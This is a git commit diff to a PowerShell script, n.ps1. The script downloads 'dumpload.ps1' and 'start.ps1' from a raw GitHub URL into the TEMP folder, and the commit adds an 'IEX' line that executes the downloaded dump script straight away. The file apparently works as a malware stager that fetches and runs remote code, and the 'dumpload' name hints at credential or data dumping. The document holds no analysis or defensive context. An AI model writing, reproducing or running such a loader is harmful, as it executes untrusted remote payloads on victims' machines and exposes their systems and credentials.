34f38901117214a081d111b180bee52c0606dd4e
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-05-01 19:34:28 +0700

    Update n.ps1

--- n.ps1
+++ n.ps1
@@ -1,6 +1,7 @@
 $url6 = "https://raw.githubusercontent.com/cia168168/folder/main/dumpload.ps1"
 $output6 = "$env:TEMP\dump.ps1"
 Invoke-WebRequest -Uri $url6 -OutFile $output6
+IEX (Get-Content $output6 | Out-String)
 $url5 = "https://raw.githubusercontent.com/cia168168/folder/main/start.ps1"
 $output5 = "$env:TEMP\start.ps1"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
